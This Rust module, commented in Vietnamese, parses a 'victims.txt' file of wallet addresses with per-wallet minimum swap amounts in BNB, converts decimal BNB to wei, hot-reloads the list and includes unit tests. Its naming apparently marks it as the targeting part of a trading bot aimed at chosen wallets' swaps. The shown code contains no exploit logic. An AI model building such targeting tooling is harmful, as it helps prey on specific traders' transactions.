use alloy_primitives::Address;
use std::collections::HashMap;
use std::path::Path;
use std::str::FromStr;
use std::time::{Duration, Instant};

pub const WEI_PER_BNB: u128 = 1_000_000_000_000_000_000u128;

/// Quy đổi chuỗi thập phân BNB ("0.01") sang wei bằng số nguyên, tránh sai số
/// float (0.01_f64 * 1e18 không luôn ra đúng 10^16).
pub fn bnb_str_to_wei(s: &str) -> Result<u128, String> {
    let s = s.trim();
    if s.is_empty() {
        return Err("so tien rong".to_string());
    }
    if s.starts_with('-') {
        return Err(format!("so am khong hop le: {s}"));
    }
    let mut parts = s.splitn(2, '.');
    let int_part = parts.next().unwrap_or("");
    let frac_part = parts.next().unwrap_or("");

    if int_part.is_empty() || !int_part.chars().all(|c| c.is_ascii_digit()) {
        return Err(format!("phan nguyen khong hop le: {s}"));
    }
    if !frac_part.chars().all(|c| c.is_ascii_digit()) {
        return Err(format!("phan thap phan khong hop le: {s}"));
    }
    if frac_part.len() > 18 {
        return Err(format!("qua 18 chu so thap phan: {s}"));
    }

    let int_val: u128 = int_part
        .parse()
        .map_err(|_| format!("tran so o phan nguyen: {s}"))?;
    let mut frac_padded = frac_part.to_string();
    while frac_padded.len() < 18 {
        frac_padded.push('0');
    }
    let frac_val: u128 = if frac_padded.is_empty() {
        0
    } else {
        frac_padded
            .parse()
            .map_err(|_| format!("tran so o phan thap phan: {s}"))?
    };

    int_val
        .checked_mul(WEI_PER_BNB)
        .and_then(|v| v.checked_add(frac_val))
        .ok_or_else(|| format!("tran so wei: {s}"))
}

fn normalize_address(raw: &str) -> Result<String, String> {
    let addr = Address::from_str(raw.trim()).map_err(|e| format!("address khong hop le '{raw}': {e}"))?;
    Ok(format!("{addr:#x}").to_lowercase())
}

/// Parse một dòng "0xAddress,min_bnb". Trả lỗi (không panic) nếu sai định dạng.
fn parse_line(line: &str) -> Result<(String, u128), String> {
    let parts: Vec<&str> = line.splitn(2, ',').collect();
    if parts.len() != 2 {
        return Err("dinh dang phai la 0xAddress,min_bnb".to_string());
    }
    let addr = normalize_address(parts[0])?;
    let wei = bnb_str_to_wei(parts[1])?;
    Ok((addr, wei))
}

#[derive(Debug, Default)]
pub struct VictimBook {
    /// key: address lowercase 0x..., value: min_swap wei
    victims: HashMap<String, u128>,
    pub error_lines: u64,
    pub last_reload: Option<Instant>,
}

impl VictimBook {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn len(&self) -> usize {
        self.victims.len()
    }

    pub fn is_empty(&self) -> bool {
        self.victims.is_empty()
    }

    pub fn entries(&self) -> impl Iterator<Item = (&String, &u128)> {
        self.victims.iter()
    }

    /// Tra đúng ví (không lấy min của ví khác). Case-insensitive theo address.
    pub fn min_for(&self, address: &str) -> Option<u128> {
        let key = normalize_address(address).ok()?;
        self.victims.get(&key).copied()
    }

    /// Nạp từ nội dung chuỗi (không panic dù dòng rác). Dòng sau thắng khi
    /// trùng address vì HashMap::insert ghi đè.
    pub fn load_from_str(&mut self, content: &str) {
        let mut map = HashMap::new();
        let mut errors = 0u64;
        for (idx, raw_line) in content.lines().enumerate() {
            let line = raw_line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            match parse_line(line) {
                Ok((addr, wei)) => {
                    map.insert(addr, wei);
                }
                Err(e) => {
                    errors += 1;
                    eprintln!("victims.txt dong {}: {} (\"{}\")", idx + 1, e, line);
                }
            }
        }
        self.victims = map;
        self.error_lines = errors;
        self.last_reload = Some(Instant::now());
    }

    pub fn load_from_file(&mut self, path: &Path) -> std::io::Result<()> {
        let content = std::fs::read_to_string(path)?;
        self.load_from_str(&content);
        Ok(())
    }

    /// Hot-reload có điều kiện thời gian, nhận `now` từ ngoài để test được với
    /// đồng hồ giả lập (Instant::now() + Duration) mà không cần sleep thật.
    pub fn reload_if_due(&mut self, path: &Path, reload_interval: Duration, now: Instant) -> bool {
        let due = match self.last_reload {
            None => true,
            Some(last) => now.saturating_duration_since(last) >= reload_interval,
        };
        if due {
            if let Err(e) = self.load_from_file(path) {
                eprintln!("victims reload that bai: {e}");
                self.last_reload = Some(now);
            }
        }
        due
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bnb_to_wei_basic() {
        assert_eq!(bnb_str_to_wei("0.01").unwrap(), 10_000_000_000_000_000u128);
        assert_eq!(bnb_str_to_wei("0.5").unwrap(), 500_000_000_000_000_000u128);
        assert_eq!(bnb_str_to_wei("1").unwrap(), WEI_PER_BNB);
        assert_eq!(bnb_str_to_wei("1.5").unwrap(), WEI_PER_BNB + WEI_PER_BNB / 2);
    }

    #[test]
    fn bnb_to_wei_rejects_garbage() {
        assert!(bnb_str_to_wei("abc").is_err());
        assert!(bnb_str_to_wei("-1").is_err());
        assert!(bnb_str_to_wei("").is_err());
        assert!(bnb_str_to_wei("1.2.3").is_err());
        assert!(bnb_str_to_wei("1.0000000000000000001").is_err()); // 19 chu so
    }

    #[test]
    fn victim_min_lookup_per_wallet() {
        let mut book = VictimBook::new();
        let content = "\
0x1111111111111111111111111111111111111111,0.01
0x2222222222222222222222222222222222222222,0.5
";
        book.load_from_str(content);
        assert_eq!(book.error_lines, 0);
        assert_eq!(book.len(), 2);

        let min_a = book
            .min_for("0x1111111111111111111111111111111111111111")
            .unwrap();
        let min_b = book
            .min_for("0x2222222222222222222222222222222222222222")
            .unwrap();
        assert_eq!(min_a, bnb_str_to_wei("0.01").unwrap());
        assert_eq!(min_b, bnb_str_to_wei("0.5").unwrap());

        let amount = bnb_str_to_wei("0.05").unwrap();
        assert!(amount >= min_a, "vi A phai pass min 0.01");
        assert!(amount < min_b, "vi B phai below_min voi 0.5");
    }

    #[test]
    fn checksum_and_lowercase_same_wallet() {
        let mut book = VictimBook::new();
        // Cùng một địa chỉ, viết hoa/thường khác nhau -> phải cùng một entry.
        let content = "0xAbCdEf1234567890AbCdEf1234567890AbCdEf12,0.02\n";
        book.load_from_str(content);
        assert_eq!(book.len(), 1);
        let via_lower = book
            .min_for("0xabcdef1234567890abcdef1234567890abcdef12")
            .unwrap();
        let via_mixed = book
            .min_for("0xAbCdEf1234567890AbCdEf1234567890AbCdEf12")
            .unwrap();
        assert_eq!(via_lower, via_mixed);
        assert_eq!(via_lower, bnb_str_to_wei("0.02").unwrap());
    }

    #[test]
    fn duplicate_address_last_line_wins() {
        let mut book = VictimBook::new();
        let content = "\
0x1111111111111111111111111111111111111111,0.01
0x1111111111111111111111111111111111111111,0.99
";
        book.load_from_str(content);
        assert_eq!(book.len(), 1);
        let min = book
            .min_for("0x1111111111111111111111111111111111111111")
            .unwrap();
        assert_eq!(min, bnb_str_to_wei("0.99").unwrap());
    }

    #[test]
    fn garbage_lines_logged_and_skipped_no_panic() {
        let mut book = VictimBook::new();
        let content = "\
# comment
not_an_address,0.01
0x1111111111111111111111111111111111111111,not_a_number
0x1111111111111111111111111111111111111111,0.01
too,many,commas,here
";
        book.load_from_str(content);
        assert_eq!(book.len(), 1);
        assert_eq!(book.error_lines, 3);
    }

    #[test]
    fn reload_respects_interval_with_injected_clock() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("victims.txt");
        std::fs::write(&path, "0x1111111111111111111111111111111111111111,0.01\n").unwrap();

        let mut book = VictimBook::new();
        let t0 = Instant::now();
        assert!(book.reload_if_due(&path, Duration::from_secs(15), t0));
        assert_eq!(book.len(), 1);

        // Chưa đủ 15s -> không reload lại (dù nội dung file đổi).
        std::fs::write(
            &path,
            "0x1111111111111111111111111111111111111111,0.01\n0x2222222222222222222222222222222222222222,0.5\n",
        )
        .unwrap();
        let t1 = t0 + Duration::from_secs(5);
        assert!(!book.reload_if_due(&path, Duration::from_secs(15), t1));
        assert_eq!(book.len(), 1);

        // Đủ 15s -> reload, thấy ví mới.
        let t2 = t0 + Duration::from_secs(16);
        assert!(book.reload_if_due(&path, Duration::from_secs(15), t2));
        assert_eq!(book.len(), 2);
    }
}
